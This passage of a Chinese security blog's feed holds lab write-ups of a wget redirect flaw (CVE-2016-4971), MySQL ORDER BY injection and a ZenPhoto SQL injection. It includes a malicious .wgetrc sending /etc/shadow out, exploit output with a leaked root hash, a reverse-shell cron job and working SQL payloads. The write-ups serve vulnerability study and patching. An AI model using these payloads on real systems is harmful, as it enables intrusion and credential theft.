      &lt;h1 id=&quot;State-Of-The-Art-OAuth2-Homakov-Edition&quot;&gt;&lt;a href=&quot;#State-Of-The-Art-OAuth2-Homakov-Edition&quot; class=&quot;headerlink&quot; title=&quot;State-Of-The-Art OAuth2 Homakov Edition&quot;&gt;&lt;/a&gt;State-Of-The-Art OAuth2 Homakov Edition&lt;/h1&gt;&lt;p&gt;考虑到官方OAuth2规范的脆弱性以及易受攻击的服务提供商和客户端的集成数，有了满足&lt;strong&gt;secure-by-default&lt;/strong&gt;原则的OAuth版本-Homakov&lt;/p&gt;
&lt;p&gt;CSRF防护初始请求&lt;code&gt;/connect/provider&lt;/code&gt;的时候，总是使用和需要&lt;code&gt;state&lt;/code&gt;参数，不允许动态的&lt;code&gt;redirect_uri&lt;/code&gt;，默认不允许&lt;code&gt;response_type=hash&lt;/code&gt;（以前是&lt;code&gt;token&lt;/code&gt;），废弃&lt;code&gt;refresh_token&lt;/code&gt;和&lt;code&gt;token&lt;/code&gt;，而不是用&lt;code&gt;appsecret_proof&lt;/code&gt;去认证每个&lt;code&gt;access_token&lt;/code&gt;，仔细检查用户想要连接的服务提供商账户，&lt;code&gt;access_token&lt;/code&gt;永不过期（把它当做公开的&lt;code&gt;user_id&lt;/code&gt;）&lt;/p&gt;
&lt;p&gt;1、用户点击连接服务提供商的按钮，无论是发起一个&lt;code&gt;POST&lt;/code&gt;表单提交（受&lt;code&gt;CSRF Token&lt;/code&gt;防护的）到&lt;code&gt;/connect/provider_name&lt;/code&gt;，还是由&lt;code&gt;GET&lt;/code&gt;导航到&lt;code&gt;/connect/provider?csrf_token=TOKEN&lt;/code&gt;，初始步骤一定要受&lt;code&gt;CSRF&lt;/code&gt;防护，它不应该被来自其他源的连接触发，必须有来自于用户的明确的确认。&lt;/p&gt;
&lt;p&gt;2、在服务端&lt;code&gt;/connect/provider&lt;/code&gt;客户端的控制器应该确认&lt;code&gt;csrf_token&lt;/code&gt;和来自于&lt;code&gt;session&lt;/code&gt;里的&lt;code&gt;token&lt;/code&gt;一致，然后生成&lt;code&gt;state token&lt;/code&gt;（CSRF Token，确保OAuth流程完整性），并命名为&lt;code&gt;&amp;lt;provider&amp;gt;-state&lt;/code&gt;存储在&lt;code&gt;session&lt;/code&gt;里。然后跳转到&lt;code&gt;provider.com/oauth/authorize?client_id=CLIENT_ID&amp;amp;redirect_uri=CLIENT/callback&amp;amp;state=STAT&lt;/code&gt;，&lt;code&gt;scope&lt;/code&gt;参数是可选的（应该仅仅允许被认证过的客户端接触一些关键的作用域）&lt;/p&gt;
    
    </summary>
    
    
      <category term="OAuth" scheme="http://wismartzy.github.io/tags/OAuth/"/>
    
  </entry>
  
  <entry>
    <title>wget 重定向漏洞（CVE-2016-4971）</title>
    <link href="http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/"/>
    <id>http://wismartzy.github.io/2016/07/26/wget-redirection-vulnerability/</id>
    <published>2016-07-26T03:55:18.000Z</published>
    <updated>2017-03-19T06:31:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971" target="_blank" rel="external">CVE-2016-4971</a>。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
<p>webserver 10.0.97.225/192.168.1.148</p>
<p>logserver 10.0.97.243/192.168.1.149</p>
</blockquote>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>在webserver上起了个nginx，nginx.conf里配置了一个302跳转，另外还起了一个ftp服务，监听21端口，<code>python -m pyftpdlib -p21 -w</code></p>
<p><img src="/images/wget-2.png" alt="wget-2"></p>
<p><img src="/images/wget-3.png" alt="wget-3"></p>
<p>logserver上wget版本信息</p>
<a id="more"></a>
<p><img src="/images/wget-1.png" alt="wget-1"></p>
<p>在机器（logserver）上使用wget发起对webserver的访问，从debug信息可以看到wget在遇到30x返回码的时候是不做任何验证就去请求FTP了。</p>
<p><img src="/images/wget-4.png" alt="wget-4"></p>
<p>ftp的log：</p>
<p><img src="/images/wget-5.png" alt="wget-5"></p>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>webserver上的/root/.bash_profile文件就被下载到了发起wget请求的logserver上了，而wget本来是想请求下载webserver上的safe-file.txt文件的。</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>在webserver上准备好.wgetrc文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# cat .wgetrc</div><div class="line">post_file = /etc/shadow</div><div class="line">output_document = /etc/cron.d/wget-root-shell</div></pre></td></tr></table></figure>
<p>假设现在有需求在服务器logserver上cron脚本每分钟去拉webserver的log文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * root wget -N http://webserver/nginx-access.log &gt; /dev/null 2&gt;&amp;1</div></pre></td></tr></table></figure>
<p>通过cron的日志可以看到job被执行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Jul 13 18:54:02 logserver CROND[4161]: (root) CMD (wget -N http://webserver/safe-file.txt &gt; /dev/null 2&gt;&amp;1)</div></pre></td></tr></table></figure>
<p>这个job是root用户执行的，所以去root家目录下查看是否已经有.wgetrc文件了</p>
<p><img src="/images/wget-6.png" alt="wget-6"></p>
<p>这里有点鸡肋的是如果该目录下已经存在.wgetrc文件，那么wget下载回来的.wgetrc文件将被重命名，就没法控制目标的下载行为了。</p>
<p>既然上传了.wgetrc文件，接下来可以再深入点，反弹个shell试试：</p>
<p>在webserver上运行exploit-db提供的exp脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# python wget_exp.py</div><div class="line">Ready? Is your FTP server running?</div><div class="line">FTP found open on 192.168.1.148:21. Let&apos;s go then</div><div class="line"></div><div class="line">Serving wget exploit on port 80...</div></pre></td></tr></table></figure>
<p>从logserver上发起到webserver的请求，此时webserver上监听的端口开始有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">We have a volunteer requesting /nginx-access.log by POST :)</div><div class="line"></div><div class="line">Received POST from wget, this should be the extracted /etc/shadow file:</div><div class="line"></div><div class="line">---[begin]---</div><div class="line"> root:$6$t8Pjy8CmXZGtsjRL$ZG.pnIDxJasLKzHA/lVR0GPlLezD1GbqVa1b3zYndE/j8jJbXbF03X8gc9AOcVkM.ZM2EYI2G7m3jCcY3QS/C.:16524:0:99999:7:::</div><div class="line">bin:*:16231:0:99999:7:::</div><div class="line">daemon:*:16231:0:99999:7:::</div><div class="line">adm:*:16231:0:99999:7:::</div><div class="line">lp:*:16231:0:99999:7:::</div><div class="line">sync:*:16231:0:99999:7:::</div><div class="line">shutdown:*:16231:0:99999:7:::</div><div class="line">halt:*:16231:0:99999:7:::</div><div class="line">mail:*:16231:0:99999:7:::</div><div class="line">operator:*:16231:0:99999:7:::</div><div class="line">games:*:16231:0:99999:7:::</div><div class="line">ftp:*:16231:0:99999:7:::</div><div class="line">nobody:*:16231:0:99999:7:::</div><div class="line">dbus:!!:16524::::::</div><div class="line">polkitd:!!:16524::::::</div><div class="line">avahi:!!:16524::::::</div><div class="line">avahi-autoipd:!!:16524::::::</div><div class="line">postfix:!!:16524::::::</div><div class="line">sshd:!!:16524::::::</div><div class="line">tcpdump:!!:16535::::::</div><div class="line">tss:!!:16545::::::</div><div class="line">user01:!!:16552:0:99999:7:::</div><div class="line">user02:!!:16553:0:99999:7:::</div><div class="line">nscd:!!:16566::::::</div><div class="line">nslcd:!!:16566::::::</div><div class="line">ntp:!!:16573::::::</div><div class="line">saslauth:!!:16575::::::</div><div class="line">mailnull:!!:16575::::::</div><div class="line">smmsp:!!:16575::::::</div><div class="line">www:!!:16653:0:99999:7:::</div><div class="line">mysql:!!:16653::::::</div><div class="line">td-agent:!!:16862::::::</div><div class="line">systemd-bus-proxy:!!:16874::::::</div><div class="line">systemd-network:!!:16874::::::</div><div class="line">unbound:!!:16874::::::</div><div class="line">ocserv:!!:16874::::::</div><div class="line">ossec:!!:16944:0:99999:7:::</div><div class="line">redis:!!:16957::::::</div><div class="line"></div><div class="line">---[eof]---</div><div class="line"></div><div class="line">Sending back a cronjob script as a thank-you for the file...</div><div class="line">It should get saved in /etc/cron.d/wget-root-shell on the victim&apos;s host (because of .wgetrc we injected in the GET first response)</div><div class="line">192.168.1.149 - - [13/Jul/2016 21:30:11] &quot;POST /nginx-access.log HTTP/1.1&quot; 200 -</div><div class="line"></div><div class="line">File was served. Check on /root/hacked-via-wget on the victim&apos;s host in a minute!</div></pre></td></tr></table></figure>
<p>此时，在logserver上已经被写入了cron任务，每分钟执行一次的反弹shell任务</p>
<p><img src="/images/wget-7.png" alt="wget-7"></p>
<p>等待一分钟，cronjob执行，反弹shell成功</p>
<p><img src="/images/wget-8.png" alt="wget-8"></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方的修复方案为在调用从FTP下载文件的函数时多传了一个原始URL参数，在生成本地文件的文件名时使用了原始的URL所带的文件名，而不是使用跳转后FTP连接中的文件名了。具体修改部分可以从<a href="https://github.com/mirror/wget/commit/e996e322ffd42aaa051602da182d03178d0f13e1" target="_blank" rel="external">commit</a>上查看到。而我们用户要做的就是升级服务器上GNU wget版本至最新或1.18以上。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我发你一个链接，你敢wget吗？</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.exploit-db.com/exploits/40064/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40064/</a></li>
<li><a href="http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/" target="_blank" rel="external">http://blog.nsfocus.net/wget-analysis-redirection-vulnerability-technology-protection-scheme/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;GNU wget 低于1.18版本均存在任意文件上传/可能还会造成远程代码执行&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971&quot;&gt;CVE-2016-4971&lt;/a&gt;。当提供给wget一个恶意的url时，wget（版本低于1.18）会执行url所指向的webserver返回头中的30x跳转，造成wget会保存攻击者提供的任意远程文件。&lt;/p&gt;
&lt;h2 id=&quot;验证&quot;&gt;&lt;a href=&quot;#验证&quot; class=&quot;headerlink&quot; title=&quot;验证&quot;&gt;&lt;/a&gt;验证&lt;/h2&gt;&lt;h3 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;webserver 10.0.97.225/192.168.1.148&lt;/p&gt;
&lt;p&gt;logserver 10.0.97.243/192.168.1.149&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;步骤&quot;&gt;&lt;a href=&quot;#步骤&quot; class=&quot;headerlink&quot; title=&quot;步骤&quot;&gt;&lt;/a&gt;步骤&lt;/h3&gt;&lt;p&gt;在webserver上起了个nginx，nginx.conf里配置了一个302跳转，另外还起了一个ftp服务，监听21端口，&lt;code&gt;python -m pyftpdlib -p21 -w&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/wget-2.png&quot; alt=&quot;wget-2&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/wget-3.png&quot; alt=&quot;wget-3&quot;&gt;&lt;/p&gt;
&lt;p&gt;logserver上wget版本信息&lt;/p&gt;
    
    </summary>
    
    
      <category term="CVE" scheme="http://wismartzy.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>MySQL Order By 注入</title>
    <link href="http://wismartzy.github.io/2016/07/15/MySQL-Order-By-Injection/"/>
    <id>http://wismartzy.github.io/2016/07/15/MySQL-Order-By-Injection/</id>
    <published>2016-07-15T13:34:30.000Z</published>
    <updated>2017-03-19T06:33:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策了。</p>
<h2 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h2><p>查找疑似和 ORDER BY 关键字有关的参数，构造合适 Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;key=value</div><div class="line">orderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;key=value</div></pre></td></tr></table></figure>
<p>因为 select 1 from information_schema.tables 会返回多个行，MySQL 会报“ERROR 1242 (21000): Subquery returns more than 1 row” 的错误，从而整条语句执行失败将无结果返回。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><a id="more"></a>
<p>首先看下 SELECT 语法（MySQL 5.7）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">    [ALL | DISTINCT | DISTINCTROW ]</div><div class="line">      [HIGH_PRIORITY]</div><div class="line">      [MAX_STATEMENT_TIME = N]</div><div class="line">      [STRAIGHT_JOIN]</div><div class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</div><div class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</div><div class="line">    select_expr [, select_expr ...]</div><div class="line">    [FROM table_references</div><div class="line">      [PARTITION partition_list]</div><div class="line">    [WHERE where_condition]</div><div class="line">    [GROUP BY &#123;col_name | expr | position&#125;</div><div class="line">      [ASC | DESC], ... [WITH ROLLUP]]</div><div class="line">    [HAVING where_condition]</div><div class="line">    [ORDER BY &#123;col_name | expr | position&#125;</div><div class="line">      [ASC | DESC], ...]</div><div class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</div><div class="line">    [PROCEDURE procedure_name(argument_list)]</div><div class="line">    [INTO OUTFILE &apos;file_name&apos;</div><div class="line">        [CHARACTER SET charset_name]</div><div class="line">        export_options</div><div class="line">      | INTO DUMPFILE &apos;file_name&apos;</div><div class="line">      | INTO var_name [, var_name]]</div><div class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</div></pre></td></tr></table></figure>
<p>可以看出一条正确 SQL 语句 ORDER BY 关键字后面可以是列名、列别名、列位置，且 ORDER BY 后面不能跟 UNION SELECT 子句，该位置的注入主要有如下姿势：</p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</div><div class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</div><div class="line">---</div><div class="line">Parameter: sort (GET)</div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</div><div class="line">    Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh)</div><div class="line">---</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 AND (SELECT * FROM (SELECT(SLEEP(5)))kYbh);</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div><div class="line">13 rows in set (5.00 sec)</div></pre></td></tr></table></figure>
<h3 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">GET parameter &apos;sort&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</div><div class="line">sqlmap identified the following injection points with a total of 46 HTTP(s) requests:</div><div class="line">---</div><div class="line">Parameter: sort (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace</div><div class="line">    Payload: sort=(SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))</div><div class="line">---</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY (SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END));</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div><div class="line">13 rows in set (0.00 sec)</div></pre></td></tr></table></figure>
<p>下图可以反映验证漏洞环节提到的情况，这也是我在测试过程中常用的验证是否存在注入点的方式。</p>
<p><img src="/images/mysql-1.png" alt="order by injection-1"></p>
<h3 id="报错注入（前提是支持报错）"><a href="#报错注入（前提是支持报错）" class="headerlink" title="报错注入（前提是支持报错）"></a>报错注入（前提是支持报错）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:10.0.22-MariaDB&apos;</div></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>除了 ORDER BY 的注入外，偶尔也会碰到 LIMIT 注入，与 ORDER BY 不同的是，LIMIT 后可以接 UNION SELECT 子句，当然前提是 LIMIT 前没有 ORDER BY 关键字。</p>
<p><img src="/images/mysql-2.png" alt="order by injection-2"></p>
<p>从前面的 SELECT 语法中可知，在报错注入姿势上，ORDER BY 和 LIMIT 的利用一致，都是依赖 PROCEDURE 关键字，但该方法也有局限，此方法只适用于 MySQL 小于5.6.6的5.x系列。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最近在挖漏洞过程中明显感觉的常规的注入问题变少了，猜测了下原因，可能一是各种扫描器大范围的扫描，二是开发者的安全意识提高了吧。不管怎样，这是好的趋势，安全问题若不修复，就会一直躺在那直到被人发现并利用。问题变少，说明厂商和白帽子都在努力。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果问一个安全/程序员如何才能防 SQL 注入问题？我想大部分人都会提到使用参数化查询，那是不是这样就高枕无忧了呢？换句话说是不是使用参数化查询后就能杜绝一切 SQL 注入问题呢？答案是否定的，参数化查询是针对参数值的绑定技术解决注入问题，而 SQL 语句中某些字段位置并不支持绑定技术，比如 ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，在 SQL 注入问题上，参数化查询就束手无策了。&lt;/p&gt;
&lt;h2 id=&quot;验证漏洞&quot;&gt;&lt;a href=&quot;#验证漏洞&quot; class=&quot;headerlink&quot; title=&quot;验证漏洞&quot;&gt;&lt;/a&gt;验证漏洞&lt;/h2&gt;&lt;p&gt;查找疑似和 ORDER BY 关键字有关的参数，构造合适 Payload：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;orderby=ASC,if(1=1,1,(select 1 from information_schema.tables))&amp;amp;key=value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;orderby=ASC,if(1=2,1,(select 1 from information_schema.tables))&amp;amp;key=value&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为 select 1 from information_schema.tables 会返回多个行，MySQL 会报“ERROR 1242 (21000): Subquery returns more than 1 row” 的错误，从而整条语句执行失败将无结果返回。&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ZenPhoto 1.4.8 二阶 SQL 注入漏洞</title>
    <link href="http://wismartzy.github.io/2016/06/30/zenphoto-1-4-8-second-order-sql-injection/"/>
    <id>http://wismartzy.github.io/2016/06/30/zenphoto-1-4-8-second-order-sql-injection/</id>
    <published>2016-06-30T07:01:06.000Z</published>
    <updated>2017-03-19T06:31:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>来源：<a href="https://www.exploit-db.com/exploits/37602/" target="_blank" rel="external">https://www.exploit-db.com/exploits/37602/</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>ZenPhoto 是一款小巧的相册软件，具备 RSS 输出、FTP 上传方式、Tag、评论回复等功能。基于 PHP+MySQL 环境，它的主旨是简单，这也就是说不管是用户还是网站管理员，都可以很容易的使用它。</p>
<p>关于二阶注入，上一篇文章有写过<a href="http://wismartzy.github.io/2016/06/22/Second-Order-SQL-Injection/">Second Order SQL Injection</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>访问</p>
<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;tab=gallery
</code></pre><p>找到<code>Sort gallery by</code>字段，设置为<code>Custom</code>，并在<code>custom filed</code>字段后面输入<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，最后点<code>Apply</code></p>
<a id="more"></a>
<p><img src="/images/zenphoto-1.png" alt="ZenPhoto-1"></p>
<p>访问</p>
<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?page=upload&amp;tab=http&amp;type=images
</code></pre><p>如果服务端开启了报错，那么就能在这个页面找到报错消息。当然一般线上服务我们都会关闭掉报错，这也没关系，继续访问</p>
<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-logs.php?page=logs
</code></pre><p>就能看到报错日志了，其中就抛出了数据库版本号</p>
<p><img src="/images/zenphoto-2.png" alt="ZenPhoto-1"></p>
<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>那么在点<code>Apply</code>的时候，发生了什么呢？我拦下了数据包</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /zenphoto-zenphoto<span class="number">-1.4</span><span class="number">.8</span>/zp-core/admin-options.php?action=saveoptions HTTP/<span class="number">1.1</span></div><div class="line">Host: localhost:<span class="number">8888</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.10</span>; rv:<span class="number">46.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">46.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;tab=gallery</div><div class="line">Cookie: zp_user_auth=93a28nygQ7CdX50LI5BdCyNYFJ8qW0wFgyGonO1hD%2FM%3D.7; iweb_safecode=56cfc43b80MDQ3MTMxMDAwMDJlNzEyPGozNTAzNWIxMGJlM2ViNjE5NGo3ND5nNTwxZmAzN2c7OT9jNWI1OjYyPDA1ZjQ2Yw; bdshare_firstime=1463652902675; PHPSESSID=1539753e6d1894d0e9af01be376fa794</div><div class="line">Connection: keep-alive</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 689</div><div class="line"></div><div 